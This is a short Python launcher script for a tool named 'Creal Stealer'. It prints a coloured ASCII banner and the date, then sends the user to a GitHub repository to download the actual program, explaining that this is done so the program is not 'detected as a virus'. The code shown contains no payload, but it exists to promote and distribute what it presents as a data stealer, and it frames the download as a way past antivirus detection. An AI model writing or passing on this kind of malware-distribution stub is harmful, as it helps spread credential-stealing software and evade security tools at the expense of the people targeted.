import requests
import time
import os
import json
import datetime
from datetime import date
from requests import get, post
from random import randint
import subprocess
import asyncio
import sys
import colorama
from colorama import Fore, Style, init
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def ultimategrabber():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + """                      
_________                       .__      _________ __                .__                
\_   ___ \_______   ____ _____  |  |    /   _____//  |_  ____ _____  |  |   ___________ 
/    \  \/\_  __ _/ __ \\__  \ |  |    \_____  \\   __\/ __ \\__  \ |  | _/ __ \_  __ 
\     \____|  | \/\  ___/ / __ \|  |__  /        \|  | \  ___/ / __ \|  |_\  ___/|  | \/
 \______  /|__|    \___  >____  /____/ /_______  /|__|  \___  >____  /____/\___  >__|   
        \/             \/     \/               \/           \/     \/          \/             
                                  
              Download                                                                 
        """)
  print(bcolors.OKBLUE + """
    You need to download the file, since we don't want this program to get detected as a virus.
    Open the tutorial section in this program for a tutorial on how to use it.
    https://github.com/Ayhuuu/Creal-Stealer
    """)
  time.sleep(10.00)
ultimategrabber()
